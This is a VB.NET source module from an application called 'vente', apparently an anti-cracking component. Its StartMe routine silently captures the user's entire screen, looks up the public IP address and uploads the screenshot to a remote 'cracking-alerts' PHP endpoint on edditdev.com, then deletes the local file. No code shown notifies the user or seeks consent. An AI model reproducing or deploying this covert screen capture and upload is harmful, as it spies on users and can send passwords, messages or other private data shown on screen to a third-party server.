Imports Guna.UI2.WinForms.Suite
Imports System.IO
Imports System.Net.Http
Imports vente.VenteData
Module GetSS


    Private random As New Random()

    Public Function Gen(ByVal length As Integer) As String
        Dim chars As String = "1234567890qwertyuiopasdfghjklzxcvbnm"
        Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(Random.Next(s.Length))).ToArray())
    End Function



    Public Sub StartMe()
        Try
            Cracking.SessionID = Gen(10)
            Dim screenshot As Bitmap = CaptureScreen()
            ' Zapisz zrzut ekranu na dysku C: jako ss1.png
            SaveScreenshot(screenshot, VentePath & Cracking.SessionID & ".png")

            DownloadIP()
            'Upload file
            UploadSSData()

        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub


    Private Async Function DownloadIP() As Task(Of String)
        Dim WebClient_1 As New System.Net.WebClient()
        Dim result As String = Await WebClient_1.DownloadStringTaskAsync("https://api.ipify.org")
        stored_ip = result.ToString
        Return result
    End Function

    Public Sub UploadSSData()
        Try
            My.Computer.Network.UploadFile(VentePath & "\" & Cracking.SessionID & ".png", "https://edditdev.com/vente/cracking-alerts/UploadUserData.php")
            IO.File.Delete(VentePath & Cracking.SessionID & ".png")
            'Build URL:
            Cracking.CreatedSSLink = "https://edditdev.com/vente/cracking-alerts/" & Cracking.SessionID & ".png"

        Catch ex As Exception
            MsgBox("ex" & ex.Message)
        End Try
    End Sub


    Function CaptureScreen() As Bitmap
        ' Przechwyć zrzut ekranu
        Dim screenBounds As Rectangle = Screen.PrimaryScreen.Bounds
        Dim screenshot As New Bitmap(screenBounds.Width, screenBounds.Height)

        Using g As Graphics = Graphics.FromImage(screenshot)
            g.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size)
        End Using

        Return screenshot
    End Function

    Sub SaveScreenshot(ByVal screenshot As Bitmap, ByVal filePath As String)
        ' Zapisz zrzut ekranu na dysku
        screenshot.Save(filePath, Imaging.ImageFormat.Png)
    End Sub

    Public Sub GetSSID()

        Dim screenshot As Bitmap = CaptureScreen()
        ' Zapisz zrzut ekranu na dysku C: jako ss1.png



    End Sub


End Module
